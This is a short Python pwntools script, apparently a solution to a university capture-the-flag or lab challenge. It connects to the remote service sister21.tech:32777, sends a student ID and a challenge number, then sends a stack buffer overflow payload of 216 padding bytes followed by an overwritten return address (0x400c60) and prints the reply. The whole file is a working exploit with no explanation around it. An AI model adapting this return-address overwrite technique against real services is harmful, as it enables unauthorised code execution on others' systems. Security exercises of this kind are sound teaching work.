from pwn import *
from pwn import p64

#p = process("./standard-3")

host = "sister21.tech"
port = 32777

p = remote(host, port)

p.recvuntil(b"NIM: ")
nim = b"13522091"
p.sendline(nim)

p.recvuntil(b"Challenge: ")
kirim = b"5"
p.sendline(kirim)

temp = p64(0x0000000000400c60)

offset = 216 * b'A'

flag = offset + temp

p.recvuntil(b"Enter your payload: ")

p.sendline(flag)

print(p.recvline())
print(p.recvline())
p.close()